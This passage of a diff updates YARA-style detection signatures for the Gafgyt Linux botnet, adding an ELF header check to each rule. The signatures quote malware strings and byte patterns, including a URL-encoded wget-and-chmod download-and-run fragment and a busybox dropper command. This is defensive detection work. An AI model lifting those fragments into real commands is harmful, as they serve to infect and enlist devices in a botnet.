@@ -2591,6 +2689,7 @@ rule Backdoor_Linux_Gafgyt_BH_2147818275_0
         $x_1_6 = "hlLjztqZ" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (5 of ($x*))
 }
 
@@ -2616,6 +2715,7 @@ rule Backdoor_Linux_Gafgyt_BI_2147818276_0
         $x_1_5 = "/dev/null" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -2642,6 +2742,7 @@ rule Backdoor_Linux_Gafgyt_G_2147818377_0
         $x_1_6 = "/etc/xinet.d" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -2665,6 +2766,7 @@ rule Backdoor_Linux_Gafgyt_H_2147818406_0
         $x_1_4 = "botnet" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 2 of ($x_1_*))) or
             (all of ($x*))
@@ -2689,6 +2791,7 @@ rule Backdoor_Linux_Gafgyt_BK_2147818448_0
         $x_2_1 = {8b 45 e0 c1 e0 02 03 45 e0 01 c0 89 45 e0 8b 45 0c 0f b6 00 0f b6 c0 03 45 e0 83 e8 30 89 45 e0 ff 45 0c 8b 45 0c 0f b6 00 3c 2f 76 0a 8b 45 0c 0f b6 00 3c 39}  //weight: 2, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2711,6 +2814,7 @@ rule Backdoor_Linux_Gafgyt_BI_2147818541_0
         $x_1_2 = {83 ec 08 ff 75 f4 ff 75 08 e8 [0-5] 83 c4 10 ff 45 f0 ff 4d 10 83 7d 10 00 7f [0-3] 8b 45 f0 c9 c3}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2737,6 +2841,7 @@ rule Backdoor_Linux_Gafgyt_BL_2147818564_0
         $x_1_6 = "npxXoudifFeEgGaACScs" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2763,6 +2868,7 @@ rule Backdoor_Linux_Gafgyt_BE_2147818619_0
         $x_1_6 = "Killing pid" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 3 of ($x_1_*))) or
             ((2 of ($x_2_*) and 1 of ($x_1_*))) or
@@ -2792,6 +2898,7 @@ rule Backdoor_Linux_Gafgyt_BE_2147818619_1
         $x_1_5 = "wget.sh%3Bchmod%20%2Bx%20wget.sh" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2816,6 +2923,7 @@ rule Backdoor_Linux_Gafgyt_BJ_2147818620_0
         $x_2_4 = "KILLAT" ascii //weight: 2
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((2 of ($x_2_*) and 1 of ($x_1_*))) or
             (all of ($x*))
@@ -2843,6 +2951,7 @@ rule Backdoor_Linux_Gafgyt_BM_2147818621_0
         $x_1_4 = "spooky-machine" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((2 of ($x_2_*) and 1 of ($x_1_*))) or
             (all of ($x*))
@@ -2870,6 +2979,7 @@ rule Backdoor_Linux_Gafgyt_BK_2147818622_0
         $x_2_4 = "KILLAT" ascii //weight: 2
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((2 of ($x_2_*) and 1 of ($x_1_*))) or
             (all of ($x*))
@@ -2898,6 +3008,7 @@ rule Backdoor_Linux_Gafgyt_BN_2147818627_0
         $x_1_5 = "npxXoudifFeEgGaACScs" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 3 of ($x_1_*))) or
             (all of ($x*))
@@ -2925,6 +3036,7 @@ rule Backdoor_Linux_Gafgyt_J_2147818960_0
         $x_1_4 = "NFOKILL" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -2947,6 +3059,7 @@ rule Backdoor_Linux_Gafgyt_BO_2147819148_0
         $x_1_2 = {bc 10 00 00 9c 23 a0 18 d2 03 a0 58 94 03 a0 5c 11 00 00 5b}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2969,6 +3082,7 @@ rule Backdoor_Linux_Gafgyt_BS_2147819149_0
         $x_1_2 = {30 9f e5 00 10 93 e5 20 20 1b e5 24 30 1b e5 02}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -2992,6 +3106,7 @@ rule Backdoor_Linux_Gafgyt_BT_2147819151_0
         $x_1_3 = {f0 24 6e ff f4 4e 5e 4e 75 4e 56 ff 50 2f 02 22 2e 00 10 20 2e 00 0c 20 40 20 01}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -3015,6 +3130,7 @@ rule Backdoor_Linux_Gafgyt_BV_2147819251_0
         $x_1_3 = {48 8b 55 d8 0f b6 02 3c 72 75 10 8b 45 f0 89 45 e4 8b 7d f4}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -3037,6 +3153,7 @@ rule Backdoor_Linux_Gafgyt_BY_2147819253_0
         $x_1_2 = {30 1b e5 00 00 53 e3 0a 00 00 0a 28 30 1b e5 0a 00 53 e3 07}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3062,6 +3179,7 @@ rule Backdoor_Linux_Gafgyt_BW_2147819268_0
         $x_1_5 = "PING" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -3087,6 +3205,7 @@ rule Backdoor_Linux_Gafgyt_BX_2147819269_0
         $x_1_5 = "OVH-KILLER" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -3108,6 +3227,7 @@ rule Backdoor_Linux_Gafgyt_BQ_2147819319_0
         $x_2_1 = {bd 27 2c 00 bf af 28 00 be af 21 f0 a0 03 10 00 bc af 30 00 c4 af 1c 00 c0 af 30 00 c4 8f 64 81 99 ?? ?? ?? ?? 00 09 f8 20 03 00}  //weight: 2, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3129,6 +3249,7 @@ rule Backdoor_Linux_Gafgyt_BP_2147819321_0
         $x_3_1 = {c2 07 a0 48 c2 08 40 00 82 08 60 ff 80 a0 60 64 [0-16] c4 07 a0 4c 82 10 00 02 c6 00 40 00 82 00 a0 04 c2 27 a0 4c 82 10 20 61 c2 23 a0 5c d0 07 a0 44 92 10 00 03 94 10 20 0a 96 10 20 01 d8 07 bf e0 da 07 bf e4}  //weight: 3, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3150,6 +3271,7 @@ rule Backdoor_Linux_Gafgyt_BV_2147819322_0
         $x_2_1 = {81 3f 00 0c 38 09 00 01 90 1f 00 0c 80 1f 00 0c 7c 09 03 78 80 1f 00 18 7d 29 02 14 88 09 00 00 54 00 06 3e 7c 03 03 78 4c c6 31 82 48 [0-5] 7c 60 1b 78 2f 80}  //weight: 2, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3175,6 +3297,7 @@ rule Backdoor_Linux_Gafgyt_K_2147819323_0
         $x_1_5 = "PROT_EXEC" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -3197,6 +3320,7 @@ rule Backdoor_Linux_Gafgyt_P_2147819324_0
         $x_1_2 = {4e 56 ff f0 20 2e 00 08 2d 40 ff f0 20 2e 00 0c 2d 40 ff f4 2d 6e 00 10 ff f8 20 2e 00 14 2d 40 ff fc 41 ee ff f0 2f 08 48 78 00 09 61 ff 00 00 0e ?? 50 8f 4e 5e}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (1 of ($x*))
 }
 
@@ -3222,6 +3346,7 @@ rule Backdoor_Linux_Gafgyt_CA_2147819488_0
         $x_1_5 = "mHoIJPqGRSTUVWXL" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3246,6 +3371,7 @@ rule Backdoor_Linux_Gafgyt_L_2147819494_0
         $x_1_4 = "Bypass" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3270,6 +3396,7 @@ rule Backdoor_Linux_Gafgyt_M_2147819495_0
         $x_1_4 = "xmhdipc" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3296,6 +3423,7 @@ rule Backdoor_Linux_Gafgyt_N_2147819496_0
         $x_1_6 = "UDP-REG" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (5 of ($x*))
 }
 
@@ -3317,6 +3445,7 @@ rule Backdoor_Linux_Gafgyt_BQ_2147819506_0
         $x_1_1 = {7d 0c 00 01 80 fc 00 01 83 d0 00 01 85 34 00 01 86 b0 00 01 88 14 00 01 89 90 00 01 8c 9c 9d e3 bf}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3339,6 +3468,7 @@ rule Backdoor_Linux_Gafgyt_BR_2147819507_0
         $x_1_2 = {58 30 42 8c 18 80 83 8f 80 20 02 00 e8 38 62 24 21 10 82 00 00 00 44 8c 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3361,6 +3491,7 @@ rule Backdoor_Linux_Gafgyt_BU_2147819508_0
         $x_1_2 = {8b 4d fc 8b 45 fc 83 e8 03 48 98 8b 14 85 20 1d 51 00 8b 45 fc 83 e8 02 48 98 8b 04 85 20 1d 51 00 31 c2 8b 45 fc 31 d0 89 c2 81 f2 b9 79 37 9e 48 63 c1 89 14 85 20 1d 51 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3385,6 +3516,7 @@ rule Backdoor_Linux_Gafgyt_BL_2147819541_0
         $x_1_4 = {80 18 02 00 21 10 43 00 21 18 40 00 18 86 82 8f 00 00 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3409,6 +3541,7 @@ rule Backdoor_Linux_Gafgyt_O_2147819659_0
         $x_1_4 = "bot.mips" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_2_*) and 1 of ($x_1_*))) or
             ((2 of ($x_2_*))) or
@@ -3435,6 +3568,7 @@ rule Backdoor_Linux_Gafgyt_CB_2147819774_0
         $x_1_2 = {c8 71 1e 51 12 22 e3 61 c8 71 1e 52 23 d1 1c 32 21 d1 21 11 e3 61 c8 71 1e 52 21 d1 1c 32}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3457,6 +3591,7 @@ rule Backdoor_Linux_Gafgyt_BZ_2147819866_0
         $x_1_2 = {00 80 01 c2 08 40 00 83 28 60 18 83 38 60 18 90 10 00 01 40 00 2b d4 01 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3481,6 +3616,7 @@ rule Backdoor_Linux_Gafgyt_Q_2147819950_0
         $x_1_4 = "UDPRAW" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((3 of ($x_1_*))) or
             ((1 of ($x_2_*) and 1 of ($x_1_*))) or
@@ -3506,6 +3642,7 @@ rule Backdoor_Linux_Gafgyt_CA_2147820136_0
         $x_2_1 = {e1 a0 c0 0d e9 2d 00 0e e9 2d d8 00 e2 4c b0 10 e2 4d d0 14 e5 0b 00 20 e3 a0 0b 02 eb [0-5] e1 a0 30 00 e5 0b 30 18 e5 1b 30 18 e1 a0 00 03 e3 a0 10 00 e3 a0 2b 02 eb [0-5] e5 1b 30 18 e5 0b 30 14 e2 8b 30 08 e5 0b 30 1c e5 9b 20 04 e5 1b c0 1c e2 4b 30 18}  //weight: 2, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3528,6 +3665,7 @@ rule Backdoor_Linux_Gafgyt_CC_2147820175_0
         $x_1_2 = {24 00 01 a5 90 00 01 a7 34 00 01 a9 88 00 01 aa 5c 00 01 ae 94 00 01 b1 54 00 01 b5 44 00 01 b6 b0 00 01 b7 60 00 01}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3551,6 +3689,7 @@ rule Backdoor_Linux_Gafgyt_CE_2147820177_0
         $x_1_3 = {48 89 c6 48 8b 84 c5 10 fe ff ff 48 89 c2 48 8b 85 60 ff ff ff 8b 00 89 c1 83 e1 3f b8 01 00 00 00 48 d3 e0 48 09 d0 48 89 84 f5 10 fe ff ff 48 8b 85 60 ff ff ff 8b 00 3b 85 78 ff ff ff}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -3576,6 +3715,7 @@ rule Backdoor_Linux_Gafgyt_R_2147820293_0
         $x_1_5 = "killed process" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_5_*) and 3 of ($x_1_*))) or
             (all of ($x*))
@@ -3601,6 +3741,7 @@ rule Backdoor_Linux_Gafgyt_CD_2147820428_0
         $x_1_2 = {30 83 e2 18 30 0b e5 00 30 a0 e3 28 30 0b e5 28 20 1b e5 2c 20 0b e5 18 30 1b e5 00 30 d3 e5 00 00 53 e3}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3625,6 +3766,7 @@ rule Backdoor_Linux_Gafgyt_CF_2147820429_0
         $x_1_4 = "/bin/busybox echo -e '%s%s' > %s/.nippon" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -3646,6 +3788,7 @@ rule Backdoor_Linux_Gafgyt_CG_2147820430_0
         $x_1_1 = {41 57 41 56 41 55 41 89 fd 41 54 44 0f b6 e2 ba 15 00 00 00 44 89 e7 55 53 48 89 cb 31 c9 48 81 ec c8 51 00 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3669,6 +3812,7 @@ rule Backdoor_Linux_Gafgyt_CL_2147820484_0
         $x_1_3 = {48 00 00 44 7d 3f e0 51 41 82 00 7c 7c 1f e8 ae 7f 1e c3 78 7c 9f ea 14 98 18 00 04 34 09 ff ff 41 82 00 64 8b e4 00 01 7c 09 03 78 3b 89 ff ff 38 84 00 01 7f 9c f8 00 3b 18 00 08 41 9c 00 48 3b a4 00 01 38 80 00 01}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -3691,6 +3835,7 @@ rule Backdoor_Linux_Gafgyt_CM_2147820485_0
         $x_1_2 = {10 2d 00 e0 18 2d 00 02 10 00 af c2 00 10 00 03 10 00 af c2 00 14 ff c0 00 30 24 02 00 20 ff c2 00 28 8f c2 00 10 18 40 00 23 00 00 00 00 ff c0 00 20 df c3 00 08 ff c3 00 18 10 00 00 08 00 00 00 00 df c3 00 20 24 62 00 01 00 40 18 2d ff c3 00 20 df c2 00 18 64 42 00 01 ff c2 00 18}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3712,6 +3857,7 @@ rule Backdoor_Linux_Gafgyt_S_2147820494_0
         $x_1_1 = {31 16 51 55 d2 08 41 2c 31 12 60 fc 7f ?? 62 9c 91 9c 93 ec 33 1c 33 9a 97 50 d6 95 91 ec 31 18 51 12 22 33 64 73 65 03 67 4d d1 0b 41}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3733,6 +3879,7 @@ rule Backdoor_Linux_Gafgyt_U_2147820495_0
         $x_1_1 = {f0 82 00 60 01 c2 27 bf f0 10 bf ff bc 01 00 00 00 9d e3 ?? 40 f0 27 a0 44 f2 27 a0 48 f4}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3755,6 +3902,7 @@ rule Backdoor_Linux_Gafgyt_CE_2147821038_0
         $x_1_2 = {18 00 dc 8f 21 20 40 00 55 55 02 3c 56 55 42 34 18 00 82 00 10 18 00 00 c3 17 04 00 23 18 62 00 44 02 c3 af 44 02 c2 8f}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3777,6 +3925,7 @@ rule Backdoor_Linux_Gafgyt_CQ_2147821039_0
         $x_1_2 = {27 c2 00 44 00 40 20 21 8f c5 00 3c 8f c6 00 38 8f c7 00 28 8f 82 80 20 [0-5] 24 59 0e ac 03 20 f8 09 [0-5] 8f dc 00 10 14 40 00 28 [0-5] 27 c2 00 44 00 40 20 21 8f c5 00 3c 8f c6 00 34 8f c7 00 24 8f 82 80 20}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3799,6 +3948,7 @@ rule Backdoor_Linux_Gafgyt_CH_2147822219_0
         $x_1_2 = {48 89 e5 48 83 ec 20 89 7d ec 8b 3d 3f 36 11 00 e8 ?? ?? ?? ?? 23 45 ec 89 45 fc e8 ?? ?? ?? ?? 89 c2 8b 45 ec f7 d0 21 d0 33 45 fc}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3825,6 +3975,7 @@ rule Backdoor_Linux_Gafgyt_CI_2147822361_0
         $x_1_6 = {89 45 c0 c7 45 bc 01 00 00 00 48 8d bd 60 ff ff ff be e0 33 41 00 ba 54 00 00 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (3 of ($x*))
 }
 
@@ -3846,6 +3997,7 @@ rule Backdoor_Linux_Gafgyt_CK_2147822366_0
         $x_1_1 = {30 4b e5 43 34 a0 e1 2f 30 4b e5 68 32 1b e5 03 38 a0 e1 23 38 a0 e1 2e 30 4b e5 43 34 a0 e1 2d 30 4b e5 00 30 a0 e3 14 30 0b e5 cc 30 9f e5 26}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3868,6 +4020,7 @@ rule Backdoor_Linux_Gafgyt_CL_2147822376_0
         $x_1_2 = {21 28 40 00 20 80 82 8f 00 00 00 00 e0 07 59 24 09 f8 20 03}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (1 of ($x*))
 }
 
@@ -3890,6 +4043,7 @@ rule Backdoor_Linux_Gafgyt_CJ_2147822461_0
         $x_1_2 = {55 48 89 e5 89 7d ec 8b 45 ec 89 05 90 17 11 00 8b 45 ec 2d 47 86 c8 61 89 05 86 17 11 00 8b 45 ec 05 72 f3 6e 3c}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3913,6 +4067,7 @@ rule Backdoor_Linux_Gafgyt_CS_2147822837_0
         $x_1_3 = {1a 03 00 00 68 2a df 69 55 8e 64 30 c7 73 9b 8b 3a 0a 6b 93 e5 06 2d 2c d6 3c 12 98 a9 76 ?? ?? 56 52 c7 34 eb 22}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -3934,6 +4089,7 @@ rule Backdoor_Linux_Gafgyt_CI_2147822882_0
         $x_1_1 = {ec 31 12 51 13 62 14 72 ba 91 ec 31 23 11 60 d1 0b 41 09 00 0d 62 b3 91 ec 31 12 51 04 71 21 21 5d d1 12}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -3956,6 +4112,7 @@ rule Backdoor_Linux_Gafgyt_CM_2147824582_0
         $x_1_2 = {21 28 40 00 20 80 82 8f 00 00 00 00 58 09 59 24 09 f8 20 03}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (1 of ($x*))
 }
 
@@ -3978,6 +4135,7 @@ rule Backdoor_Linux_Gafgyt_CN_2147824583_0
         $x_1_2 = {00 24 42 5a 88 ac 43 00 04 8f c3 00 18 3c 02 3c 6e 34 42}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4000,6 +4158,7 @@ rule Backdoor_Linux_Gafgyt_I_2147824862_0
         $x_1_2 = {3c 40 81 e5 40 40 81 e5 d8 01 9f e5 1c fb ff eb 35 5c a0 e3 01 3a 8d e2 01 1a 8d e2 38 00 83 e5 34 10 81 e2 08 00 a0 e1 10 20 a0 e3 b6 53 c3 e1 e6 fa ff eb 01 00 70 e3}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (1 of ($x*))
 }
 
@@ -4022,6 +4181,7 @@ rule Backdoor_Linux_Gafgyt_CT_2147825029_0
         $x_1_2 = {a2 00 18 8f c4 00 50 00 60 ?? ?? 24 06 00 0a 24 07 00 01 8f 82 80 24 00 00 00 00 24 59 0a d0 03 20 f8 09 00 00 00 00 8f dc 00 20 8f}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4044,6 +4204,7 @@ rule Backdoor_Linux_Gafgyt_CO_2147825977_0
         $x_1_2 = {00 62 10 21 8c 42 00 00 8f c4 00 30 00 40 28 21 8f 99 83 48 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4068,6 +4229,7 @@ rule Backdoor_Linux_Gafgyt_CP_2147826657_0
         $x_1_4 = {9b d0 ac 43 00 04 8f c3 00 18 3c 02 3c 6e 34 42 f3 72 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4091,6 +4253,7 @@ rule Backdoor_Linux_Gafgyt_CR_2147826823_0
         $x_1_3 = {48 c1 eb 05 48 89 9d 10 fe ff ff 48 8b 85 10 fe ff ff 48 c1 e0 02 48 8d 14 c5 00 00 00 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4112,6 +4275,7 @@ rule Backdoor_Linux_Gafgyt_V_2147827071_0
         $x_1_1 = {00 20 a0 e3 24 30 4b e5 23 20 4b e5 ?? 0d a0 e3 ?? 00 80 e2 ?? ?? 00 eb 00 30 a0 e1 22 30 4b e5 43 34 a0 e1 21 30 4b e5 ?? ?? 9f e5 ?? ?? 00 eb 00 30 a0 e1 20 30 0b e5 24 30 4b e2 14 00 1b e5 03 10 a0 e1 10 20 a0 e3 ?? ?? 00 eb 00 30 a0 e1 10 30 0b e5 10 30 1b e5 01 00 73 e3 02 00 00 1a 14 00 1b e5}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4134,6 +4298,7 @@ rule Backdoor_Linux_Gafgyt_W_2147827289_0
         $x_1_2 = {26 10 22 01 27 18 02 00 21 10 4b 00 26 10 43 00 24 10 4a 00 f8 ff 40 10 04 00 84 24 fc ff 82 ?? ff ff 88 24 fc ff 83 24 fd ff 86 24 03 00 45 14 fe ff 87 24 08 00 e0 03 21 10 60 00}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4156,6 +4321,7 @@ rule Backdoor_Linux_Gafgyt_X_2147827290_0
         $x_1_2 = {01 22 10 26 00 02 18 27 00 4b 10 21 00 43 10 26 00 4a 10 24 10 40 ff f8 24 84 00 04 ?? 82 ff fc 24 88 ff ff 24 83 ff fc 24 86 ff fd 14 45 00 03 24 87 ff fe 03 e0 00 08 00 60 10 21}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4178,6 +4344,7 @@ rule Backdoor_Linux_Gafgyt_CW_2147827514_0
         $x_1_2 = {a2 00 18 8f c4 00 50 00 60 28 21 24 06 00 0a 24 07 00 01 8f 82 80 20 00 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4201,6 +4368,7 @@ rule Backdoor_Linux_Gafgyt_CW_2147827514_1
         $x_1_3 = {6e 3c 02 3c 72 f3 42 34 21 18 62 00 18 80 82 8f 00 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4224,6 +4392,7 @@ rule Backdoor_Linux_Gafgyt_CR_2147827827_0
         $x_1_3 = {80 3d e0 e3 05 08 00 74 fd bf b7 ff 0c eb 35 83 c0 04 a3 24 e0 0c ff d2 a1 06 8b 10 85 d2 75 eb b8 00 fe 6f df de 00 85 c0 74 10 2b ?? ?? 04 dc 16 e8 04 7f ?? ?? 83 c4 10 c6 05 2c f6 bd fd 38 01 c9 53 8d b4 26 24 55 2a 54 b9 ff fd 5f 77 88 5a 81 c2 f4 5e}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -4248,6 +4417,7 @@ rule Backdoor_Linux_Gafgyt_CQ_2147827831_0
         $x_1_4 = {00 34 af c6 00 38 af c7 00 3c af c0 00 24 24 02 00 20 af c2 00 20 8f c2 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4270,6 +4440,7 @@ rule Backdoor_Linux_Gafgyt_Y_2147828437_0
         $x_1_2 = {34 42 79 b9 00 62 20 26 8f 82 80 18 00 06 18 80 24 42 2a 60 00 62 10 21 ac 44 00 00 8f c2 00 08}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4293,6 +4464,7 @@ rule Backdoor_Linux_Gafgyt_CT_2147828582_0
         $x_1_3 = {8f 82 80 20 00 00 00 00 24 59 07 dc 03 20 f8 09 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4316,6 +4488,7 @@ rule Backdoor_Linux_Gafgyt_JJ_2147829081_0
         $x_1_4 = {00 a2 18 26 8f c2 00 08 00 00 00 00 00 62 18 26 3c 02 9e 37 34 42 79 b9 00 62 20 26}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -4338,6 +4511,7 @@ rule Backdoor_Linux_Gafgyt_CY_2147829084_0
         $x_1_2 = {bd ff b8 af bf 00 44 af be 00 40 03 a0 f0 21 af bc 00 10 af c4 00 48 af c5 00 4c af c6 00 50 af c7 00 54 af c0 00 30 af c0 00 2c 8f c2 00 4c}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4360,6 +4534,7 @@ rule Backdoor_Linux_Gafgyt_CZ_2147829085_0
